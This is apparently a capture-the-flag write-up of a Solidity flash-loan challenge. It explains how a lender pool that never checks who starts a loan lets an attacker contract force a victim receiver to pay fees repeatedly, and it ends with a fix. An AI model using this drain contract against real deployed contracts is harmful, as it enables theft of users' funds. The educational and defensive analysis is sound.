We have two primary contracts in this system:

The `FlashLoanReceiver` contract, which handles receiving and repaying flash loans.
The `NaiveReceiverLenderPool` contract, which is a pool from which flash loans can be requested.
Here is a simplified version of the `FlashLoanReceiver` contract:

```solidity
contract FlashLoanReceiver is IERC3156FlashBorrower {
    // ...
    function onFlashLoan(
        address,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external returns (bytes32) {
        // ... validation checks ...

        uint256 amountToBeRepaid;
        unchecked {
            amountToBeRepaid = amount + fee;
        }

        _executeActionDuringFlashLoan();

        SafeTransferLib.safeTransferETH(pool, amountToBeRepaid);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
    // ...
}
```

The `FlashLoanReceiver` contract, when it receives a flash loan, pays back the loan plus a fee. It uses the `_executeActionDuringFlashLoan()` function for handling the loan, which is empty in this case.

The second important contract is `NaiveReceiverLenderPool`. It manages the pool of funds that can be borrowed, and it handles loan requests:

```solidity
contract NaiveReceiverLenderPool is ReentrancyGuard, IERC3156FlashLender {
    // ...
    function flashLoan(
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool) {
        // ... validation checks ...

        uint256 balanceBefore = address(this).balance;

        // Transfer ETH and handle control to receiver
        SafeTransferLib.safeTransferETH(address(receiver), amount);
        if(receiver.onFlashLoan(
            msg.sender,
            ETH,
            amount,
            FIXED_FEE,
            data
        ) != CALLBACK_SUCCESS) {
            revert CallbackFailed();
        }

        if (address(this).balance < balanceBefore + FIXED_FEE)
            revert RepayFailed();

        return true;
    }
    // ...
}
```

Now, where is the `vulnerability?` It's in the `flashLoan` function of `NaiveReceiverLenderPool`. This function does not verify if the borrower (or the receiver contract in this case) is the one who is actually initiating the flash loan request.

```solidity
function flashLoan(
    IERC3156FlashBorrower receiver,
    address token,
    uint256 amount,
    bytes calldata data
) external returns (bool) {
    // Missing validation check here
}
```

This oversight is crucial because the `onFlashLoan` function of the receiver's contract gets called, which could have unintended side effects such as the payment of fees.

## Exploit

An attacker can use the `AttackNaiveReceiver` contract to exploit this vulnerability by making flash loan requests on behalf of the victim contract, without the victim initiating these requests. This results in the victim's contract paying the flash loan fees multiple times, effectively draining the victim's funds.

```solidity
contract AttackNaiveReceiver {
    NaiveReceiverLenderPool pool;
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor(address payable _pool) {
        pool = NaiveReceiverLenderPool(_pool);
    }

    function attack(address victim) public {
        for (int i = 0; i < 10; i++) {
            pool.flashLoan(IERC3156FlashBorrower(victim), ETH, 1 ether, "");
        }
    }
}
```

## Prevention

So, how can we prevent this?
The key lies in correctly validating the borrower's address when a flash loan is requested. We can add a `require` statement in the `flashLoan` function of the `NaiveReceiverLenderPool` contract to verify that the borrower is the one who initiates the flash loan request. This prevents unauthorized flash loans on behalf of the victim.

```solidity
function flashLoan(
    IERC3156FlashBorrower receiver,
    address token,
    uint256 amount,
    bytes calldata data
) external returns (bool) {
    require(receiver == msg.sender, "The borrower must be the sender");
    // ... rest of the code ...
}
```
